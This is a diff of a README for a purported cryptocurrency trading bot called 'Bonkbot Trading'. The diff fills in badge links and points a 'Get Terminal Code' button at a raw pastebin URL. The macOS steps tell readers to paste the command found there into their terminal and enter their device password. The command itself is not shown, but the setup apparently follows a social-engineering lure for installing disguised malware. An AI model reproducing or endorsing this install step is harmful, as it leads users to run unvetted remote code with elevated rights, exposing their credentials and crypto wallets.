@@ -1,11 +1,11 @@
 # Bonkbot Trading - Advanced Cryptocurrency Trading Bot [Latest Build]
 
-[![About](https://img.shields.io/badge/About-Bonkbot%20Trading-blue)](link)
-[![Installation Works](https://img.shields.io/badge/How-Installation-Works-green)](link)
-[![Bot Works](https://img.shields.io/badge/How-the-Bot-Works-orange)](link)
-[![Installation on Windows](https://img.shields.io/badge/BonkBot-Installation-on-Windows-purple)](link)
-[![Installation on MacOS](https://img.shields.io/badge/BonkBot-Installation-on-MacOS-purple)](link)
-[![SEO Keywords](https://img.shields.io/badge/SEO-Keywords-yellow)](link)
+[![About](https://img.shields.io/badge/About-Bonkbot%20Trading-blue)](https://github.com/Bonkbot-Trading/.github/blob/main/profile/README.md#what-is-bonkbot-trading)
+[![How](https://img.shields.io/badge/Installation-Works-green)](https://github.com/Bonkbot-Trading/.github/blob/main/profile/README.md#-this-is-an-installer-trading-bot)
+[![How](https://img.shields.io/badge/Bot-Works-orange)](https://github.com/Bonkbot-Trading/.github/blob/main/profile/README.md#heres-how-the-bot-works-after-installation)
+[![BonkBot](https://img.shields.io/badge/Installation-on-Windows-purple)](https://github.com/Bonkbot-Trading/.github/blob/main/profile/README.md#%EF%B8%8F-installing-and-using-bonkbot-trading-on-windows)
+[![BonkBot](https://img.shields.io/badge/Installation-on-MacOS-purple)](https://github.com/Bonkbot-Trading/.github/blob/main/profile/README.md#-how-to-install-bonkbot-trading-on-macos)
+[![SEO](https://img.shields.io/badge/Keywords-yellow)](https://github.com/Bonkbot-Trading/.github/blob/main/profile/README.md#-seo-keywords)
 
 <div align="center">
 
@@ -145,7 +145,7 @@ bonkbot-trading/
 
 1. Click on the "Get terminal code" button and copy the installation command there.
 
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](link)
+[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/DLbWk5a3)
 
 2. Open the terminal on your device and paste the command you copied above, then press the "Return" button.
 3. Enter your device password and confirm the installation. 
